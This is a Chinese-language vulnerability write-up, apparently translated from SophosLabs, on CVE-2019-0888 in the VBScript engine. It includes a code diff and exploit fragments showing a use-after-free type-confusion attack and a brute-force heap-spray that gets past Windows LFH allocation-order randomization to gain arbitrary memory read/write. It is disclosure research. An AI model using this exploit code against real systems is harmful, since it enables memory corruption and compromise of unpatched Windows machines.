     Dim UafArrayA(6),UafArrayB(6)
     Dim UafCounter
    @@ -101,7 +112,8 @@ Public Default Property Get Q
         Dim objectImitatingArray
         Q=CDbl("174088534690791e-324") ' db 0, 0, 0, 0, 0Ch, 20h, 0, 0
         For idx=0 To 6
    -        UafArrayA(idx)=0
    +        On Error Resume Next
    +        Set m = RS(idx).NextRecordset(resueObjectA_arr)
         Next
         Set objectImitatingArray=New FakeReuseClass
         objectImitatingArray.mem = FakeArrayString
    @@ -116,7 +128,8 @@ Public Default Property Get P
         Dim objectImitatingInteger
         P=CDbl("636598737289582e-328") ' db 0, 0, 0, 0, 3, 0, 0, 0
         For idx=0 To 6
    -        UafArrayB(idx)=0
    +        On Error Resume Next
    +        Set m = RS(7+idx).NextRecordset(resueObjectB_int)
         Next
         Set objectImitatingInteger=New FakeReuseClass
         objectImitatingInteger.mem=Empty16BString
    @@ -136,19 +149,7 @@ Sub UafTrigger
         For idx=20 To 38
             Set objectArray(idx)=New ReuseClass
         Next
    -    UafCounter=0    
    -    For idx=0 To 6
    -        ReDim FreedObjectArray(1)
    -        Set FreedObjectArray(1)=New ClassTerminateA
    -        Erase FreedObjectArray
    -    Next
         Set resueObjectA_arr=New ReuseClass
    -    UafCounter=0
    -    For idx=0 To 6
    -        ReDim FreedObjectArray(1)
    -        Set FreedObjectArray(1)=New ClassTerminateB
    -        Erase FreedObjectArray
    -    Next
         Set resueObjectB_int=New ReuseClass
     End Sub
事实证明，此漏洞适用于运行Windows7的系统，但不适用于Windows8或更高版本。原始捕获的漏洞利用也是如此。漏洞利用由于“低碎片堆(LFH)分配顺序随机化”而中断，这是Windows
8中引入的堆的安全措施，它[阻断了简单的use-after-free漏洞利用](https://www.malwaretech.com/2019/04/analysis-of-a-vb-script-heap-overflow.html)方案。
## 绕过低碎片堆分配顺序随机化
下面是Microsoft引入LFH分配顺序随机化后堆行为如何变化的一个示例：
引入分配顺序随机化改变了malloc-> free-> malloc执行的结果，从遵循LIFO（后进先出）逻辑转变为不确定性。
为什么这会打破漏洞利用呢？请考虑以下摘选的注释漏洞利用代码：
    Class ReplacingClass_Array
    Public Default Property Get Q
        ...
        For idx=0 To 6
            On Error Resume Next
            Set m = RS(idx).NextRecordset(reuseObjectA_arr)
        Next
        Set objectImitatingArray=New FakeReuseClass
        ...
在VBScript中，所有自定义类对象都由VBScriptClassC++类内部表示。VBScript执行自定类对象实例化语句（示例代码第8行）时调用函数VBScriptClass::Create。它使用分配的0x44字节大小来保存VBScriptClass对象。
当控制流执行到第8行时，For循环刚好完成reuseObjectA_arr的销毁，其是自定义类ReuseClass的一个实例。这将导致调用VBScriptClass析构函数，释放先前分配的0x44字节。然后，第8行继续创建一个新对象objectImitatingArray，这是一个不同的自定义类FakeReuseClass。
成功运行类型混淆攻击的基础是，假设objectImitatingArray将被分配与刚刚释放的reuseObjectA_arr相同的堆内存资源。但是，正如前文提到的，在启用了分配顺序随机化的情况下，并不能做此假设，随机化的堆将会破坏该漏洞利用。
由于类型混淆攻击的结果，内存会损坏。发生损坏的堆分配并不是VBScriptClass本身的顶级（0x44）分配，而是一个与之绑定的、大小为0x108字节的子分配，用于存储对象的方法和变量。负责此子分配的函数是NameList::FCreateVval，其在创建VBScriptClass后不久调用（参见[文章2](https://securelist.com/delving-deep-into-vbscript-analysis-of-cve-2018-8174-exploitation/86333/)）。
下面更加具体地说明需要满足的条件，如果在reuseObjectA_arr销毁后，一个新的VBScript对象接收到与之前reuseObjectA_arr相同的0x108字节大小的分配地址，则类型混淆攻击会成功运行。与两个对象绑定的其他分配（包括0x44字节大小的顶级分配），不一定要获得匹配的地址。
该技术的内存损坏部分的具体细节并不是很容易理解，建议阅读[卡巴斯基的背景文章](https://securelist.com/delving-deep-into-vbscript-analysis-of-cve-2018-8174-exploitation/86333/)以更好地理解它，但这里是它的要点。
ReuseClass的方法SetProp具有以下语句：mem=Value。Value是一个对象变量，因此在完成赋值之前必须调用其[Default
Property
Getter](http://www.stealthbot.net/wiki/VBScript_class#Default_property_or_method)
vbscript引擎（vbscript.dll）调用内部函数AssignVar来执行此类赋值。这是一个简化的伪代码，用来解释它的工作原理：
    AssignVar(VARIANT *destinationObject, char *destinationVariableName, VARIANT *source) {
      // here, destinationObject is a ReuseClass instance, destinationVariableName is "mem", source is 
      // get the address of object 's member variable with the name .
      VARIANT *destinationPointer = CScriptRuntime::GetVarAdr(destinationObject, destinationVariableName);
      // if the given source is an object, call the object's
      // default property getter to get the actual source value
      if (source->vt == VT_IDISPATCH) {
        VARIANT *sourceValue = VAR::InvokeByDispID(source);
      }
      // perform the assignment
      *destinationPointer = *sourceValue;
    }
函数VAR::InvokeByDispID调用源对象的默认属性getter，允许我们在AssignVar执行过程中运行任意的VBScript代码。如果我们使用该空间来触发destinationObject内存中的销毁和替换（利用该漏洞），我们就能够利用AssignVar继续执行到destinationPointer的赋值（第十四行），而不会察觉到其指向的内存可能已经被篡改。
正在写入的内存地址是CScriptRuntime::GetVarAdr的返回值，它是指向给定对象0x108分配空间某处的指针。它在分配空间中的精确偏移量取决于给定对象的类定义，特别是其方法和字段名称的长度。
通过强制公共成员变量mem使用不同的偏移量来实现ReuseClass和FakeReuseClass的定义。这样一来，我们强制最终的赋值来破坏对象的mem变量的头部，以便将其转换为基指针为null且长度为0x7fffffff的数组类型。
CVE-2018-8174的漏洞利用使用了一种一次性的方法来尝试解决类型混淆攻击，这意味着在销毁reuseObjectA_arr之后只会创建一个新的对象。正如前文所述，这只能在Windows
8之前的操作系统上稳定运行，它们缺少LFH分配顺序随机化的特性。
为了使这种漏洞利用在Windows10系统上有效，我们可以实现一种暴力的方法来尝试类型混淆攻击。我们可以批量创建新对象，而不是创建单个的新对象，这样就可以确保释放的0x108空间最终被分配到其中一个对象中。
下面是将代码转换为通过暴力实现的方法：
    Set reuseObjectA_arr=New ReuseClass
    ...
    Class ReplacingClass_Array
    Public Default Property Get Q
        Dim objectImitatingArray
        Q=CDbl("174088534690791e-324") ' db 0, 0, 0, 0, 0Ch, 20h, 0, 0
        For i=0 To 6
            DecrementRefcount(reuseObjectA_arr)
        Next
        For i=0 to UBound(UafArrayA)
            Set objectImitatingArray=New FakeReuseClass
            objectImitatingArray.mem = FakeArrayString
            For j=0 To 6
                Set UafArrayA(i,j)=objectImitatingArray
            Next
        Next
    End Property
    End Class
下面是上述代码的实际逻辑的可视化视图：
当UafArrayA数组被新的FakeReuseClass对象大量填充，并且mem=Value赋值完成后，我们就可以在数组上进行迭代，找到其mem变量已成功被损坏成为数组的对象。
    For i=0 To UBound(UafArrayA)
        Err.Clear
        a = UafArrayA(i,0).mem(Empty16BString_addr)
        If Err.Number = 0 Then
            Exit For
        End If
    Next
    If i > UBound(UafArrayA) Then
        MsgBox("Could not find an object corrupted by reuseObjectA_arr")
    Else
        MsgBox("Got UafArrayA_obj from UafArrayA(" & i & ")")
        Set UafArrayA_obj = UafArrayA(i,0)
    End If
被损坏的对象是唯一一个不会在第三行代码中引发异常的对象，一旦我们找到它，它就可以通过任何索引进行引用，允许在进程内存空间内的任意地址进行读写操作。
通过对原始漏洞利用过程的修正，它现在也可以在Windows 10系统上有效运行。
## PoC
可以在[SophosLabs GitHub
repository](https://github.com/sophoslabs/CVE-2019-0888)找到PoC